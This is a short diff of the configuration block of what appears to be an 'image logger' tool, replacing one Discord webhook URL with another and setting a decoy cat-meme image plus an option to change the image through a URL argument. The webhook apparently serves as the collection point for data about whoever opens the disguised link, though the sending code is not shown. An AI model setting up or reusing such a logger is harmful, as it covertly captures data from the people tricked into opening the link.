@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1342543929803014235/m_-OOy0tY30XLH5ply92PUotClqEcrBOyhYVVHo5y-_xvc6nnuSb3kMHmSS4O45EbzEs",
+    "webhook": "https://discord.com/api/webhooks/1372946191289024512/b02WVOPZ8FGWw4CI2poLu5ylIMTFTivkyaM9oSeZsOHokro-1p3jcWm5O847Uhe1Ffu-",
 "image": "https://www.google.com/search?client=ms-android-xiaomi-terr1-rso2&sca_esv=890b852af12b1b22&sxsrf=AHTn8zokdBa_3zw8r6yAF5kJM18Mit4gPQ:1740160184603&q=uia+cat+meme+jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
